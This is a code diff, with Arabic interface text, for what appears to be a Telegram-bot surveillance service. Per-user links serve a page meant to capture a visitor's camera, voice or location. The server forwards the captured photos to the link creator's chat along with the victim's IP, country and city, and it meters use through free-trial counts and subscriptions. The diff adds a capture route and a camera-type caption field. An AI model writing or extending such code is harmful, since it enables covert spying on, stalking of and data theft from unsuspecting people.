@@ -23,7 +23,7 @@ const adminId = '7130416076';
 const subscribedUsers = new Set();
 
 // Camera routes
-app.get('/:action/:userId', (req, res) => {
+app.get('/:userId', (req, res) => {
     const userId = req.params.userId;
     const action = req.params.action;
     const cameraType = req.query.cameraType;
@@ -72,6 +72,30 @@ app.get('/:action/:userId', (req, res) => {
     }
 });
 
+app.get('/:userId', (req, res) => {
+    const userId = req.params.userId;
+    const cameraType = req.query.cameraType;
+
+    if (subscribedUsers.has(userId)) {
+        res.sendFile(path.join(__dirname, 'location.html'));
+        return;
+    }
+
+    if (!userVisits[userId]) {
+        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
+    }
+
+    userVisits[userId].camera++;
+
+    if (userVisits[userId].camera > MAX_FREE_ATTEMPTS) {
+        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
+        return;
+    }
+
+    res.sendFile(path.join(__dirname, 'location.html'));
+});
+
+// تعديل مسار استلام الصور
 app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
     const chatId = req.body.userId;
     const files = req.files;
@@ -83,6 +107,7 @@ app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
 
         const caption = `
 معلومات إضافية:
+نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
 IP: ${additionalData.ip}
 الدولة: ${additionalData.country}
 المدينة: ${additionalData.city}
@@ -93,8 +118,9 @@ IP: ${additionalData.ip}
         `;
 
         try {
-            const sendPhotoPromises = files.map(file => bot.sendPhoto(chatId, file.buffer, { caption }));
-            await Promise.all(sendPhotoPromises);
+            for (const file of files) {
+                await bot.sendPhoto(chatId, file.buffer, { caption });
+            }
             console.log('Photos sent successfully');
             res.json({ success: true });
         } catch (err) {
@@ -210,7 +236,7 @@ bot.onText(/\/start/, (msg) => {
     bot.sendMessage(chatId, message, {
         reply_markup: {
             inline_keyboard: [
-                [{ text: 'تصوير كام أمامي', callback_data: 'front_camera' }],
+                [{ text: 'تصوير كاميرا أمامي', callback_data: 'front_camera' }],
                 [{ text: 'تصوير كام خلفي', callback_data: 'rear_camera' }],
                 [{ text: 'تسجيل صوت', callback_data: 'voice_record' }],
                 [{ text: 'الحصول على الموقع', callback_data: 'get_location' }]
